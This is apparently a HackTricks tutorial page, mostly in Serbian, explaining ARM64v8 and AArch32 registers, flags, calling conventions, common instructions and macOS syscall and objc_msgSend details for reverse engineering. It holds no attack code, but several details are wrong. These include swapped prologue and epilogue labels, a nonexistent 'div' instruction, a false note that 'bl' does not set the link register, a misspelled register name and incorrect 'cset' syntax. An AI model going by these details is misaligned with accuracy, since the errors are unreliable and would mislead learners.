# Uvod u ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Nivoi izuzetaka - EL (ARM64v8)**

U ARMv8 arhitekturi, nivoi izvršavanja, poznati kao Exception Levels (EL), definišu nivo privilegija i mogućnosti izvršnog okruženja. Postoje četiri nivoa izuzetaka, od EL0 do EL3, od kojih svaki ima različitu namenu:

1. **EL0 - User Mode**:
- Najmanje privilegovani nivo i koristi se za izvršavanje običnog aplikativnog koda.
- Aplikacije koje rade na EL0 su izolovane jedna od druge i od sistemskog softvera, što povećava sigurnost i stabilnost.
2. **EL1 - Operating System Kernel Mode**:
- Većina operativnih sistema kernela radi na ovom nivou.
- EL1 ima više privilegija nego EL0 i može pristupiti sistemskim resursima, ali uz neka ograničenja radi očuvanja integriteta sistema.
3. **EL2 - Hypervisor Mode**:
- Ovaj nivo se koristi za virtualizaciju. Hipervizor koji radi na EL2 može upravljati više operativnih sistema (svaki u svom EL1) na istom fizičkom hardveru.
- EL2 obezbeđuje funkcije za izolaciju i kontrolu virtualizovanih okruženja.
4. **EL3 - Secure Monitor Mode**:
- Najprivilegovaniji nivo, često korišćen za secure boot i trusted execution okruženja.
- EL3 može upravljati pristupima između secure i non-secure stanja (npr. secure boot, trusted OS, itd.).

Korišćenje ovih nivoa omogućava strukturiran i bezbedan način upravljanja različitim aspektima sistema, od korisničkih aplikacija do najprivilegovanijeg sistemskog softvera. ARMv8-ov pristup privilegijama pomaže u efikasnoj izolaciji komponenti sistema, čime se poboljšava sigurnost i stabilnost sistema.

## **Registri (ARM64v8)**

ARM64 ima **31 registra opšte namene**, označenih `x0` kroz `x30`. Svaki može da skladišti **64-bitnu** (8-bajtnu) vrednost. Za operacije koje zahtevaju samo 32 bita, isti registri se mogu pristupiti u 32-bit modu koristeći imena `w0` kroz `w30`.

1. **`x0`** do **`x7`** - Obično se koriste kao privremeni (scratch) registri i za prosleđivanje parametara funkcijama.
- **`x0`** takođe nosi povratne podatke funkcije
2. **`x8`** - U Linux kernelu, `x8` se koristi kao broj sistemskog poziva za `svc` instrukciju. **U macOS-u se koristi x16!**
3. **`x9`** do **`x15`** - Više privremenih registara, često korišćeni za lokalne promenljive.
4. **`x16`** i **`x17`** - **Intra-procedural Call Registers**. Privremeni registri za neposredne vrednosti. Takođe se koriste za indirektne pozive funkcija i PLT stub-ove.
- **`x16`** se koristi kao **broj sistemskog poziva** za **`svc`** instrukciju u **macOS**.
5. **`x18`** - **Platform register**. Može biti korišćen kao registar opšte namene, ali na nekim platformama ovaj registar je rezervisan za platformno-specifične svrhe: pokazivač na trenutni thread environment block u Windows-u, ili pokazivač na trenutno **executing task structure in linux kernel**.
6. **`x19`** do **`x28`** - Ovo su callee-saved registri. Funkcija mora sačuvati vrednosti ovih registara za svog pozivaoca, pa se oni smestе na stek i vraćaju pre povratka pozivaocu.
7. **`x29`** - **Frame pointer** za praćenje stack frame-a. Kada se kreira novi stack frame prilikom poziva funkcije, sadržaj **`x29`** se **smešta na stek** i adresa novog frame pointer-a (adresa **`sp`**) se **smešta u ovaj registar**.
- Ovaj registar se može koristiti i kao registar opšte namene, iako se obično koristi kao referenca za **lokalne promenljive**.
8. **`x30`** ili **`lr`** - **Link register**. Drži **adresu povratka** kada se izvrši `BL` (Branch with Link) ili `BLR` (Branch with Link to Register) instrukcija, tako što se vrednost **`pc`** skladišti u ovaj registar.
- Može se koristiti i kao bilo koji drugi registar.
- Ako trenutna funkcija poziva novu funkciju i time prepisuje `lr`, ona će ga smestiti na stek na početku — to je epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) i vratiti ga na kraju — to je prolog (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
9. **`sp`** - **Stack pointer**, koristi se za praćenje vrha steka.
- vrednost **`sp`** uvek treba da bude poravnata na najmanje **quadword** ili može doći do izuzetka poravnanja.
10. **`pc`** - **Program counter**, pokazuje na sledeću instrukciju. Ovaj registar se može ažurirati samo kroz generisanje izuzetaka, povratke iz izuzetaka i grane. Jedine obične instrukcije koje mogu čitati ovaj registar su branch with link instrukcije (BL, BLR) koje skladište adresu **`pc`** u **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Takođe se zove **`wzr`** u svojoj **32**-bitnoj formi. Može se koristiti da lako dobije vrednost nula (česta operacija) ili da se izvrše poređenja koristeći **`subs`** kao **`subs XZR, Xn, #10`** pri čemu rezultat nije nigde smešten (u **`xzr`**).

Registarski oblik **`Wn`** su **32-bitna** verzija **`Xn`** registra.

> [!TIP]
> Registri od `X0` do `X18` su volatilni, što znači da njihove vrednosti mogu biti promenjene pozivima funkcija i prekinućima. Međutim, registri od `X19` do `X28` su ne-volatilni, što znači da njihove vrednosti moraju biti sačuvane preko poziva funkcija ("callee saved").

### SIMD i floating-point registri

Pored toga, postoji još **32 registra dužine 128 bitova** koji se mogu koristiti u optimizovanim single instruction multiple data (SIMD) operacijama i za izvođenje floating-point aritmetike. Oni se nazivaju Vn registri i mogu takođe raditi u **64**-bitnom, **32**-bitnom, **16**-bitnom i **8**-bitnom režimu, kada se onda zovu **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.

### Sistemski registri

**Postoje stotine sistemskih registara**, takođe zvanih special-purpose registri (SPRs), koji se koriste za **monitoring** i **kontrolu** ponašanja procesora.\
Mogu se čitati ili postavljati samo pomoću posebnih instrukcija **`mrs`** i **`msr`**.

Specijalni registri **`TPIDR_EL0`** i **`TPIDDR_EL0`** se često pojavljuju pri reverse engineering-u. Sufiks `EL0` označava **minimalni nivo izuzetka** sa kojeg se registar može pristupiti (u ovom slučaju EL0 je regularni nivo privilegija na kojem obični programi rade).\
Često se koriste za skladištenje **osnovne adrese thread-local storage region-a** u memoriji. Obično je prvi čitljiv i upisiv za programe koji rade u EL0, dok se drugi može čitati iz EL0 i pisati iz EL1 (npr. kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** sadrži nekoliko komponenti procesa serijalizovanih u operativnom sistemu vidljivom **`SPSR_ELx`** specijalnom registru, gde X označava **nivo privilegija** izuzetka koji je izazvan (ovo omogućava vraćanje stanja procesa kada izuzetak završi).\
Ovo su dostupna polja:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Condition flag-ovi **`N`**, **`Z`**, **`C`** i **`V`**:
- **`N`** znači da je operacija dala negativan rezultat
- **`Z`** znači da je operacija dala nulu
- **`C`** znači da je operacija imala carry
- **`V`** znači da je operacija imala signed overflow:
- Zbir dva pozitivna broja daje negativan rezultat.
- Zbir dva negativna broja daje pozitivan rezultat.
- U oduzimanju, kada se veliki negativan broj oduzme od manjeg pozitivnog (ili obrnuto), i rezultat se ne može predstaviti unutar opsega datog broja bitova.
- Procesor ne zna da li je operacija potpisana ili ne, pa proverava C i V kod operacija i signalizuje ako je došlo do carry-a u kontekstu signed/unsigned operacija.

> [!WARNING]
> Neće sve instrukcije ažurirati ove flag-ove. Neke poput **`CMP`** ili **`TST`** hoće, a druge koje imaju sufiks `s` kao **`ADDS`** takođe ih ažuriraju.

- Trenutni **flag širine registra (`nRW`)**: Ako flag drži vrednost 0, program će se izvršavati u AArch64 execution state nakon povratka.
- Trenutni **Exception Level** (**`EL`**): Regularan program koji radi u EL0 ima vrednost 0
- **Single stepping** flag (**`SS`**): Koriste debugeri za single-step izvršavanje postavljanjem SS na 1 unutar **`SPSR_ELx`** kroz izuzetak. Program izvrši jedan korak i izazove single-step izuzetak.
- **Illegal exception** state flag (**`IL`**): Koristi se da označi kada privileged softver izvrši nevaljan transfer između nivoa izuzetaka; taj flag se postavlja na 1 i procesor pokreće illegal state izuzetak.
- **`DAIF`** flag-ovi: Ovi flag-ovi omogućavaju privilegovanom programu selektivno maskiranje određenih eksternih izuzetaka.
- Ako je **`A`** 1, to znači da će se trigirati **asynchronous aborts**. **`I`** konfiguriše odgovor na eksterni hardverski **Interrupt Requests** (IRQ). `F` je vezan za **Fast Interrupt Requests** (FIRs).
- **Stack pointer select** flag-ovi (**`SPS`**): Privilegovani programi koji rade u EL1 i iznad mogu menjati između korišćenja sopstvenog stack pointer registra i user-mode jednog (npr. između `SP_EL1` i `EL0`). Ova zamena se vrši upisom u specijalni registar **`SPSel`**. Ovo se ne može uraditi iz EL0.

## **Konvencija poziva (ARM64v8)**

ARM64 calling convention navodi da se **prvih osam parametara** funkcije prosleđuje u registrima **`x0`** kroz **`x7`**. **Dodatni** parametri se prosleđuju na **stek**. Vrednost koju funkcija vraća se prosleđuje u registru **`x0`**, ili i u **`x1`** ako je **128 bita dugačka**. Registri **`x19`** do **`x30`** i **`sp`** moraju biti **sačuvani** preko poziva funkcija.

Prilikom čitanja funkcije u asembleru, tražite **function prologue i epilogue**. **Prologue** obično uključuje **čuvanje frame pointer-a (`x29`)**, **postavljanje novog frame pointer-a** i **alokaciju prostora na steku**. **Epilogue** obično uključuje **vraćanje sačuvanog frame pointer-a** i **povratak** iz funkcije.

### Calling Convention u Swift

Swift ima sopstvenu **calling convention** koja se može naći na [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Uobičajene instrukcije (ARM64v8)**

ARM64 instrukcije generalno imaju **format `opcode dst, src1, src2`**, gde je **`opcode`** operacija koja će biti izvršena (npr. `add`, `sub`, `mov`, itd.), **`dst`** je registar destinacije gde će rezultat biti smešten, a **`src1`** i **`src2`** su registarski operandi. Takođe je moguće koristiti immediate vrednosti umesto registara.

- **`mov`**: **Premesti** vrednost iz jednog **registra** u drugi.
- Primer: `mov x0, x1` — Premesti vrednost iz `x1` u `x0`.
- **`ldr`**: **Učitaj** vrednost iz **memorije** u **registar**.
- Primer: `ldr x0, [x1]` — Učita vrednost sa memorijske lokacije na koju pokazuje `x1` u `x0`.
- **Offset mode**: Offset koji utiče na origin pointer je naznačen, na primer:
- `ldr x2, [x1, #8]`, ovo će učitati u x2 vrednost sa adrese x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, ovo će učitati u x2 objekat iz niza x0, sa pozicije x1 (index) * 4
- **Pre-indexed mode**: Ovo će primeniti računanje na origin, dobiti rezultat i takođe ažurirati origin sa rezultatom.
- `ldr x2, [x1, #8]!`, ovo će učitati `x1 + 8` u `x2` i sačuvati u x1 rezultat `x1 + 8`
- `str lr, [sp, #-4]!`, Smešta link register u sp i ažurira registar sp
- **Post-index mode**: Ovo je kao prethodno, ali se adresa memorije pristupi prvo, a zatim se offset izračuna i sačuva.
- `ldr x0, [x1], #8`, učitaj iz `x1` u `x0` i ažuriraj x1 sa `x1 + 8`
- **PC-relativno adresiranje**: U ovom slučaju adresa za učitavanje se izračunava relativno u odnosu na PC registar
- `ldr x1, =_start`, Ovo će učitati adresu gde simbol `_start` počinje u x1 u odnosu na trenutni PC.
- **`str`**: **Smeštanje** vrednosti iz **registra** u **memoriju**.
- Primer: `str x0, [x1]` — Smešta vrednost iz `x0` u memorijsku lokaciju na koju pokazuje `x1`.
- **`ldp`**: **Load Pair of Registers**. Ova instrukcija **učitava dva registra** iz **uzastopnih memorijskih lokacija**. Memorijska adresa se obično formira dodavanjem offset-a vrednosti u drugom registru.
- Primer: `ldp x0, x1, [x2]` — Učitava `x0` i `x1` sa memorijskih lokacija na `x2` i `x2 + 8`.
- **`stp`**: **Store Pair of Registers**. Ova instrukcija **smešta dva registra** u **uzastopne memorijske lokacije**.
- Primer: `stp x0, x1, [sp]` — Smešta `x0` i `x1` na lokacije `sp` i `sp + 8`.
- `stp x0, x1, [sp, #16]!` — Smešta `x0` i `x1` na lokacije `sp+16` i `sp + 24`, i ažurira `sp` na `sp+16`.
- **`add`**: **Saberi** vrednosti dva registra i smesti rezultat u registar.
- Sintaksa: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (registar ili immediate)
- \[shift #N | RRX] -> Izvrši shift ili RRX
- Primer: `add x0, x1, x2` — Sabira vrednosti u `x1` i `x2` i smešta rezultat u `x0`.
- `add x5, x5, #1, lsl #12` — Ovo je jednako 4096 (1 shiftovan 12 puta) -> 1 0000 0000 0000 0000
- **`adds`**: Izvršava `add` i ažurira flag-ove
- **`sub`**: **Oduzmi** vrednosti dva registra i smesti rezultat u registar.
- Pogledajte **`add`** **sintaksu**.
- Primer: `sub x0, x1, x2` — Oduzima vrednost u `x2` od `x1` i smešta rezultat u `x0`.
- **`subs`**: Kao `sub`, ali ažurira flag-ove
- **`mul`**: **Množenje** vrednosti dva registra i smeštanje rezultata u registar.
- Primer: `mul x0, x1, x2` — Množi vrednosti u `x1` i `x2` i smešta rezultat u `x0`.
- **`div`**: **Deljenje** vrednosti jednog registra drugim i smeštanje rezultata u registar.
- Primer: `div x0, x1, x2` — Deli vrednost u `x1` sa `x2` i smešta rezultat u `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Dodaje 0-ice na kraj pomerajući ostale bitove napred (množenje za 2^n)
- **Logical shift right**: Dodaje 0-ice na početak pomerajući ostale bitove nazad (deljenje za 2^n kod unsigned)
- **Arithmetic shift right**: Kao **`lsr`**, ali umesto dodavanja 0-ica, ako je najznačajniji bit 1 dodaju se 1-ice (deljenje za 2^n kod signed)
- **Rotate right**: Kao **`lsr`**, ali ono što se izbaci sa desne strane se pridodaje levoj strani
- **Rotate Right with Extend**: Kao **`ror`**, ali sa carry flag-om kao "najznačajnijim bitom". Dakle carry se pomera na bit 31, a uklonjeni bit ide u carry flag.
- **`bfm`**: **Bit Field Move**, ove operacije **kopiraju bitove `0...n`** iz vrednosti i postavljaju ih na pozicije **`m..m+n`**. **`#s`** specificira **levo najudaljeniji bit**, a **`#r`** količinu rotacije udesno.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopira bitfield iz registra i umešta ga u drugi registar.
- **`BFI X1, X2, #3, #4`** Umešta 4 bita iz X2 počevši od 3. bita u X1
- **`BFXIL X1, X2, #3, #4`** Ekstrahuje iz 3. bita X2 četiri bita i kopira ih u X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bita iz X2 i umešta ih u X1 počevši od pozicije 3, nulteći desne bitove
- **`SBFX X1, X2, #3, #4`** Ekstrahuje 4 bita počevši od bita 3 iz X2, sign-extends ih i postavlja rezultat u X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bita iz X2 i umešta ih u X1 počevši od pozicije 3, nulteći desne bitove
- **`UBFX X1, X2, #3, #4`** Ekstrahuje 4 bita počevši od bita 3 iz X2 i smešta zero-extended rezultat u X1.
- **Sign Extend To X:** Proširuje znak (ili dodaje 0-ice u unsigned verziji) vrednosti da bi se mogle izvršiti operacije:
- **`SXTB X1, W2`** Proširuje znak bajta iz `W2` u `X1` ( `W2` je polovina `X2`) da popuni 64 bita
- **`SXTH X1, W2`** Proširuje znak 16-bitnog broja iz `W2` u `X1` da popuni 64 bita
- **`SXTW X1, W2`** Proširuje znak iz `W2` u `X1` da popuni 64 bita
- **`UXTB X1, W2`** Dodaje 0-ice (unsigned) na bajt iz `W2` u `X1` da popuni 64 bita
- **`extr`**: Ekstrahuje bitove iz specificiranog para registara koji su konkatenirani.
- Primer: `EXTR W3, W2, W1, #3` Ovo će konkatenirati W1+W2 i uzeti od bita 3 W2 do bita 3 W1 i smestiti u W3.
- **`cmp`**: **Uporedi** dva registra i postavi condition flag-ove. To je alias od `subs` postavljajući destinacioni registar na zero registar. Korisno da se zna da li je `m == n`.
- Podržava istu sintaksu kao `subs`
- Primer: `cmp x0, x1` — Upoređuje vrednosti u `x0` i `x1` i postavlja condition flag-ove u skladu s tim.
- **`cmn`**: **Compare negative** operand. U ovom slučaju je alias od `adds` i podržava istu sintaksu. Korisno da se zna da li je `m == -n`.
- **`ccmp`**: Conditional comparison, poređenje koje će se izvršiti samo ako je prethodno poređenje bilo tačno i specifično postavi nzcv bitove.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ako x1 != x2 i x3 < x4, skoči na func
- Ovo zato što će se **`ccmp`** izvršiti samo ako je prethodni `cmp` bio `NE`; ako nije, bitovi `nzcv` će biti postavljeni na 0 (što neće zadovoljiti `blt` poređenje).
- Ovo se takođe može koristiti kao `ccmn` (isto ali negativno, kao `cmp` vs `cmn`).
- **`tst`**: Proverava da li su neki od bitova oba operanda 1 (radi kao `ANDS` bez skladištenja rezultata). Koristan za proveru registra sa maskom.
- Primer: `tst X1, #7` Proverava da li je bilo koji od poslednja 3 bita X1 postavljen
- **`teq`**: XOR operacija odbacujući rezultat
- **`b`**: Neuslovni branch
- Primer: `b myFunction`
- Napomena: ovo neće popuniti link registar adresom povratka (nije pogodno za subroutine pozive koji moraju da se vrate)
- **`bl`**: **Branch** with link, koristi se za **pozivanje** subrutine. Smešta **adresu povratka u `x30`**.
- Primer: `bl myFunction` — Poziva funkciju `myFunction` i smešta adresu povratka u `x30`.
- Napomena: ovo neće popuniti link registar adresom povratka (nije pogodno za subroutine pozive koji moraju da se vrate)
- **`blr`**: **Branch** with Link to Register, koristi se za **pozivanje** subrutine gde je cilj **specificiran u registru**. Smešta adresu povratka u `x30`.
- Primer: `blr x1` — Poziva funkciju čija je adresa u `x1` i smešta adresu povratka u `x30`.
- **`ret`**: **Povratak** iz subrutine, tipično koristeći adresu u **`x30`**.
- Primer: `ret` — Vraća se iz trenutne subrutine koristeći adresu povratka u `x30`.
- **`b.<cond>`**: Uslovni branch-ovi
- **`b.eq`**: **Branch ako je jednako**, na osnovu prethodnog `cmp` instrukcije.
- Primer: `b.eq label` — Ako je prethodni `cmp` našao dve jednake vrednosti, skoči na `label`.
- **`b.ne`**: **Branch ako nije jednako**. Ova instrukcija proverava condition flag-ove (koje je postavio prethodni cmp) i ako nisu jednaki, grana se.
- Primer: Nakon `cmp x0, x1`, `b.ne label` — Ako vrednosti u `x0` i `x1` nisu jednake, skoči na `label`.
- **`cbz`**: **Compare and Branch on Zero**. Upoređuje registar sa nulom, i ako je jednak, grana.
- Primer: `cbz x0, label` — Ako je vrednost u `x0` nula, skoči na `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Upoređuje registar sa nulom, i ako nije jednak, grana.
- Primer: `cbnz x0, label` — Ako je vrednost u `x0` različita od nule, skoči na `label`.
- **`tbnz`**: Test bit i branch na nonzero
- Primer: `tbnz x0, #8, label`
- **`tbz`**: Test bit i branch na zero
- Primer: `tbz x0, #8, label`
- **Conditional select operations**: Operacije čije se ponašanje menja u zavisnosti od condition bitova.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ako je uslov istinit, X0 = X1, inače X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ako je istinito, Xd = Xn, inače Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ako je istinito, Xd = Xn + 1, inače Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ako je istinito, Xd = Xn, inače Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ako je istinito, Xd = NOT(Xn), inače Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ako je istinito, Xd = Xn, inače Xd = - Xm
- `cneg Xd, Xn, cond` -> Ako je istinito, Xd = - Xn, inače Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ako je istinito, Xd = 1, inače Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ako je istinito, Xd = \<all 1>, inače Xd = 0
- **`adrp`**: Izračunaj **page adresu simbolа** i smesti je u registar.
- Primer: `adrp x0, symbol` — Izračunava page adresu `symbol` i smešta je u `x0`.
- **`ldrsw`**: **Učitaj** potpisani **32-bit** vrednost iz memorije i **sign-extend** je na 64 bita.
- Primer: `ldrsw x0, [x1]` — Učita potpisanu 32-bit vrednost sa memorijske lokacije na koju pokazuje `x1`, proširi je na 64 bita i smešta u `x0`.
- **`stur`**: **Smeštanje vrednosti registra u memoriju**, koristeći offset od drugog registra.
- Primer: `stur x0, [x1, #4]` — Smešta vrednost iz `x0` na memorijsku adresu koja je 4 bajta veća od adrese u `x1`.
- **`svc`** : Napravi **sistemski poziv**. Skraćenica od "Supervisor Call". Kada procesor izvrši ovu instrukciju, on **prelazi iz user moda u kernel mode** i skače na određenu lokaciju u memoriji gde je kod kernela za obradu sistemskih poziva.

- Primer:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Sačuvajte link registar i frame pointer na stek**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Podesi novi pokazivač okvira**: `mov x29, sp` (postavlja novi pokazivač okvira za trenutnu funkciju)
3. **Alociraj prostor na steku za lokalne promenljive** (ako je potrebno): `sub sp, sp, <size>` (gde je `<size>` broj potrebnih bajtova)

### **Epilog funkcije**

1. **Dealociraj lokalne promenljive (ako su alocirane)**: `add sp, sp, <size>`
2. **Vrati link registar i pokazivač okvira**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Povratak**: `ret` (vraća kontrolu pozivaocu koristeći adresu u link registru)

## AARCH32 stanje izvršavanja

Armv8-A podržava izvršavanje 32-bitnih programa. **AArch32** može raditi u jednom od **dva skupa instrukcija**: **`A32`** i **`T32`** i može se prebacivati između njih putem **`interworking`**.\
**Privilegovani** 64-bitni programi mogu rasporediti izvršavanje 32-bitnih programa tako što izvrše transfer nivoa izuzetka na niže privilegovan 32-bitni režim.\
Obratite pažnju da tranzicija sa 64-bitnog na 32-bitni režim nastaje pri nižem nivou izuzetka (na primer, 64-bitni program u EL1 koji pokreće program u EL0). To se radi tako što se postavi **bit 4 od** **`SPSR_ELx`** specijalnog registra **na 1** kada je `AArch32` procesni thread spreman za izvršavanje, a ostatak `SPSR_ELx` čuva CPSR programa koji se izvršava u **`AArch32`**. Zatim privilegovani proces poziva instrukciju **`ERET`** tako da procesor pređe u **`AArch32`** ulazeći u A32 ili T32 u zavisnosti od CPSR**.**

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
Ovo se postavlja tokom **interworking branch instrukcija**, ali se može postaviti i direktno drugim instrukcijama kada je PC postavljen kao destinacioni registar. Primer:

Another example:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Postoji 16 32-bitnih registara (r0-r15). **Od r0 do r14** mogu se koristiti za **bilo koju operaciju**, međutim neki su obično rezervisani:

- **`r15`**: Programski brojač (uvek). Sadrži adresu sledeće instrukcije. U A32 current + 8, u T32, current + 4.
- **`r11`**: Pokazivač okvira (Frame Pointer)
- **`r12`**: Registar za intra-procedural pozive
- **`r13`**: Pokazivač steka (Napomena: stek je uvek poravnat na 16 bajtova)
- **`r14`**: Link registar

Pored toga, registri se čuvaju u **`banked registries`**. To su mesta koja skladište vrednosti registara i omogućavaju **brzo prebacivanje konteksta** pri obradi izuzetaka i privilegovanih operacija, kako bi se izbegla potreba za ručnim čuvanjem i vraćanjem registara svaki put.  
Ovo se radi tako što se **stanje procesora iz `CPSR` sačuva u `SPSR`** mod-a procesora u koji je izuzetak preusmeren. Prilikom povratka iz izuzetka, **`CPSR`** se vraća iz **`SPSR`**.

### CPSR - Registar trenutnog statusa programa

U AArch32, CPSR funkcioniše slično kao **`PSTATE`** u AArch64 i takođe se čuva u **`SPSR_ELx`** kada se desi izuzetak da bi se kasnije izvršavanje vratilo:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Polja su podeljena u nekoliko grupa:

- Application Program Status Register (APSR): aritmetičke zastavice i dostupan iz EL0
- Execution State Registers: ponašanje procesa (upravlja OS).

#### Application Program Status Register (APSR)

- Zastavice **`N`**, **`Z`**, **`C`**, **`V`** (isto kao u AArch64)
- Zastavica **`Q`**: Postavlja se na 1 kad god se desi saturacija celih brojeva tokom izvršavanja specijalizovane saturirajuće aritmetičke instrukcije. Kada je postavljena na **`1`**, zadržaće tu vrednost dok se ručno ne postavi na 0. Pored toga, ne postoji instrukcija koja implicitno proverava njenu vrednost — mora se pročitati ručno.
- **`GE`** (Greater than or equal) zastavice: Koriste se u SIMD (Single Instruction, Multiple Data) operacijama, kao što su "parallel add" i "parallel subtract". Ove operacije omogućavaju obradu više podatkovnih elemenata u jednoj instrukciji.

Na primer, instrukcija **`UADD8`** sabira četiri para bajtova (iz dva 32-bitna operanda) paralelno i skladišti rezultate u 32-bitni registar. Zatim postavlja **`GE`** zastavice u **`APSR`** na osnovu tih rezultata. Svaka GE zastavica odgovara jednom od sabiranja bajtova, označavajući da li je sabiranje za taj par bajtova **prelilo**.

Instrukcija **`SEL`** koristi ove GE zastavice za izvođenje uslovnih akcija.

#### Execution State Registers

- Bitovi **`J`** i **`T`**: **`J`** treba da bude 0, a ako je **`T`** 0 koristi se instrukcijski skup A32, a ako je 1 koristi se T32.
- IT Block State Register (`ITSTATE`): To su bitovi 10-15 i 25-26. Oni čuvaju uslove za instrukcije unutar grupe prefiksirane sa **`IT`**.
- Bit **`E`**: označava redosled bajtova (endianness).
- Mode i Exception Mask bitovi (0-4): Određuju trenutno stanje izvršavanja. Peti bit ukazuje da li program radi kao 32bit (1) ili 64bit (0). Ostala četiri predstavljaju mod izuzetka koji se trenutno koristi (kad se izuzetak dogodi i obrađuje). Postavljeni broj označava trenutni prioritet u slučaju da se pokrene drugi izuzetak dok se ovaj obrađuje.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Određeni izuzeci mogu biti onemogućeni korišćenjem bitova **`A`**, `I`, `F`. Ako je **`A`** 1, to znači da će biti pokrenuti **asynchronous aborts**. **`I`** konfiguriše odgovor na spoljne hardverske zahteve za prekid (Interrupt Requests, IRQs). A **F** se odnosi na **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Pogledajte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) ili pokrenite `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls će imati **x16 > 0**.

### Mach Traps

Pogledajte u [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) `mach_trap_table` i u [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototipove. Maksimalan broj Mach traps je `MACH_TRAP_TABLE_COUNT` = 128. Mach traps će imati **x16 < 0**, pa morate pozivati brojeve iz prethodne liste sa **minusom**: **`_kernelrpc_mach_vm_allocate_trap`** je **`-10`**.

Takođe možete pregledati **`libsystem_kernel.dylib`** u disassembleru da biste pronašli kako pozvati ove (i BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> Ponekad je lakše proveriti **dekompilovani** kod iz **`libsystem_kernel.dylib`** **nego** proveravati **izvorni kod** jer se kod nekoliko sistemskih poziva (BSD i Mach) generiše putem skripti (pogledajte komentare u izvornom kodu), dok u dylib-u možete pronaći šta se zapravo poziva.

### machdep calls

XNU podržava drugi tip poziva nazvan machine dependent. Brojevi ovih poziva zavise od arhitekture i ni pozivi ni brojevi nisu zagarantovani da ostanu konstantni.

### comm page

Ovo je kernel-owned memorijska stranica koja je mapirana u adresni prostor svakog korisničkog procesa. Namenjena je da ubrza prelaz iz user mode-a u kernel space brže nego korišćenje sistemskih poziva za kernel servise koji se toliko često koriste da bi taj prelaz bio veoma neefikasan.

Na primer poziv `gettimeofdate` čita vrednost `timeval` direktno iz comm page-a.

### objc_msgSend

Veoma je često pronaći ovu funkciju u programima pisanima u Objective-C ili Swift. Ova funkcija omogućava pozivanje metode Objective-C objekta.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pokazivač na instancu
- x1: op -> Selector metode
- x2... -> Ostali argumenti pozvane metode

Dakle, ako postavite breakpoint pre grane ka ovoj funkciji, možete lako otkriti šta se poziva u lldb pomoću (u ovom primeru objekat poziva objekat iz `NSConcreteTask` koji će izvršiti komandu):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Podešavanjem env promenljive **`NSObjCMessageLoggingEnabled=1`** moguće je zabeležiti kada se ova funkcija pozove u fajlu kao što je `/tmp/msgSends-pid`.
>
